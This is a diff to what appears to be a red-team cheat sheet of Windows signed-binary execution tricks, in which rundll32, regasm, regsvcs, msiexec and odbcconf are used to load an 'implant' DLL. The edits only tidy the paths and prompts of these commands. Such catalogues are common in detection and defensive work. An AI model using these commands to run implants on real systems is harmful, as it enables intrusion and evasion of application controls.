@@ -34,6 +34,10 @@ C:\> rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();Ge
 
 ## Regasm
 
+```
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe
+```
+
 Loads the target .DLL file and executes the RegisterClass function.
 
 ```
@@ -43,7 +47,7 @@ C:\> regasm.exe AllTheThingsx64.dll
 Loads the target .DLL file and executes the UnRegisterClass function.
 
 ```
-regasm.exe /U AllTheThingsx64.dll
+C:\> regasm.exe /U AllTheThingsx64.dll
 ```
 
 ## Regsvcs
@@ -57,19 +61,19 @@ C:\> regsvcs.exe AllTheThingsx64.dll
 Execute the DLL implant  (calls `DLLRegisterServer`).
 
 ```
-C:\> msiexec /y "C:\path\to\implant.dll"
+C:\> msiexec.exe /y "C:\path\to\implant.dll"
 ```
 
 Unregisters the target DLL.
 
 ```
-C:\> msiexec /z "C:\path\to\implant.dll"
+C:\> msiexec.exe /z "C:\path\to\implant.dll"
 ```
 
 ## odbcconf
 
 ```
-C:\> odbcconf /a {REGSVR C:\path\to\implant.dll}
+C:\> odbcconf.exe /a {regsvr.exe C:\path\to\implant.dll}
 ```
 
 ## CMSTP
